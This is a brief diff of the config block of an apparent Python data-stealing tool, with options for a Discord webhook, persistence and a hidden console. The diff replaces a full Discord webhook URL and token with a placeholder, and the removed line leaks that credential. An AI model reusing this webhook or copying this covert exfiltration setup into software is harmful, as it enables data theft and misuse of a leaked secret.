@@ -10,7 +10,7 @@ from cryptography.fernet import Fernet
 # "WEBHOOKHERE"
 
 config = {
-    'webhook': "https://discord.com/api/webhooks/1182993632597381170/YeeVBYzhuvmeDluhMyj6lOHjChL7MJHz3uPIONreWMdoHVEOvIMKr4-r55Kkabq5UQel",
+    'webhook': "WEBHOOKHERE",
     'persist': False,
     'keep-alive': False,  
     'hideconsole': True, 
